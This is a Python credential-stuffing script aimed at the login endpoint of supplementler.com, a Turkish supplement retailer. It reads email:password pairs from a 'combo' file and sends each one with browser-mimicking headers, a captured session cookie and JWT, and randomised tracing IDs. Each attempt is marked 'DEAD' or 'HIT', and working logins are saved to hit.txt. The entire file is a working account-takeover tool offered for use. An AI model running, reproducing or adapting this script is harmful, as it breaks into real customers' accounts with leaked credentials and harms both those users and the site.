import requests
import random
import time


headers = {
    'authority': 'www.supplementler.com',
    'method': 'POST',
    'path': '/Customer/SigninWithOtpAjax',
    'scheme': 'https',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-length': '103',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': 'higherThan1200=yes; _gcl_aw=GCL.1767032458.Cj0KCQiA6sjKBhCSARIsAJvYcpOiZys2Q1PWfesNlQd9wASbJjeDJBWhS3TU7Zbf0_4amfrFsf1OdbYaAjXOEALw_wcB; ComparisonProductList={"CategoryCount":0,"ProductCount":0}; ASP.NET_SessionId=tabevhlsf50inhxnvs3i5pfz; DIKEY.TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJHdWlkIjoiMmFlNjRmYjItOWZlNi00NGM3LTg4MTAtYTBjZjUwYWM1NWZkIiwiRW1haWwiOiIiLCJGdWxsTmFtZSI6Ikd1ZXN0IFVzZXIiLCJJc0d1ZXN0Ijp0cnVlLCJJc3N1ZWRBdCI6MTc2NzAzMjQ1OCwiUmVuZXdBdCI6MTc2NzA2MTI1OCwianRpIjoiOWY1ZDMxMjgtZjMzNS00MDRhLWJjODItN2Q4YmUxMDViYjI2XzE3NjcwMzI0NTgifQ._iHTfyvYM1bszxAUHUNflB8_TGtjDHRvPqi3sybK2BA; VisitorType-s=; crtg_dd=0; __utmz=other; DIKEY.AUTH=; _rdt_uuid=1767032461214.70b16652-5df5-489c-bd3d-a0ddd490bb78; _gcl_ag=2.1.k0aaaaad1emcoely53pyc7rlyxakqihuo_p$i1767032662; _gcl_gs=2.1.k1$i1767032660$u156349369; _ga=GA1.1.1664500529.1767032662; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22zMhQE0RJCDz8VUXWsVkw%22%2C%22expiryDate%22%3A%222026-12-29T18%3A24%3A25.166Z%22%7D; _hjSessionUser_391993=eyJpZCI6IjhkM2M3M2Q2LTdjMzAtNWY1ZS04NzZiLWNmYTVlMWU5M2I3ZSIsImNyZWF0ZWQiOjE3NjcwMzI2NjYwMDEsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_391993=eyJpZCI6IjQwZDNmMjU4LTI0ZTEtNGI0OC04NzhmLTk4ODFiMTBjNDc3ZiIsImMiOjE3NjcwMzI2NjYwMDIsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _ym_uid=1767032666981662659; _ym_d=1767032666; _clck=nwtnft%5E2%5Eg29%5E0%5E2189; _sgf_user_id=-626586552337825791; _sgf_session_id=-626586552337825792; _clsk=dmewkz%5E1767032667945%5E1%5E1%5Eh.clarity.ms%2Fcollect; _sgf_exp=; _sgf_ud=%7B%22gm%22%3A%22REAL%22%7D; _sgf_push_permission_asked=true; _ga_KKPC27LYY8=GS2.1.s1767032662$o1$g0$t1767032673$j50$l0$h0; _gcl_au=1.1.1415468649.1767032664.1973815320.1767032669.1767032715; _dd_s=aid=16bc5cc4-e964-486e-b174-40b1e63130df&rum=2&id=aa2c3d5f-5f06-41de-a8bf-838aa28285f5&created=1767032459461&expire=1767033652941',
    'origin': 'https://www.supplementler.com',
    'priority': 'u=1, i',
    'referer': 'https://www.supplementler.com/login/?returnUrl=/?utm_source=google&utm_medium=cpc&utm_id=12468048661&gad_source=1&gad_campaignid=12468048661&gbraid=0aaaaad1emcoely53pyc7rlyxakqihuo_p',
    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'tracestate': 'dd=s:1;o:rum',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
    'x-datadog-origin': 'rum',
    'x-datadog-sampling-priority': '1',
    'x-requested-with': 'XMLHttpRequest'
}

data = {
    'IsPopup': 'false',
    'EmailOrPhone': '',
    'Password': '',
    'ReturnUrl': '/?utm_source=google'
}

url = 'https://www.supplementler.com/Customer/SigninWithOtpAjax'

combo_file = input("Dosya yolunu giriniz. combo.txt: ")

with open(combo_file, 'r') as f:
    for line in f:
        line = line.strip()
        if ':' not in line:
            continue
        email, password = line.split(':', 1)
        

        parent_id = random.randint(0, 2**64 - 1)
        trace_id = random.randint(0, 2**128 - 1)
        traceparent = f"00-{trace_id:032x}-{parent_id:016x}-01"
        headers['traceparent'] = traceparent
        headers['x-datadog-parent-id'] = str(parent_id)
        headers['x-datadog-trace-id'] = str(trace_id)
        
        data['EmailOrPhone'] = email
        data['Password'] = password
        
        response = requests.post(url, headers=headers, data=data)
        
        if response.text == '{"StatusEnum":-1,"Status":-1,"Messages":["HatalÄ± bilgi girildi."],"Data":null,"NoChange":false}':
            print(f"â DEAD {email}:{password} >> by tutuzq")
        elif response.text.startswith('{"StatusEnum":1,"Status":1,"Messages":[],"Data":'):
            print(f"â HÄ°T {email}:{password} >> by tutuzq")
            with open('hit.txt', 'a') as hit_file:
                hit_file.write(f"{email}:{password}\n")
        else:
            print(f"Bilinmeyen response: {response.text}")
        
        time.sleep(1)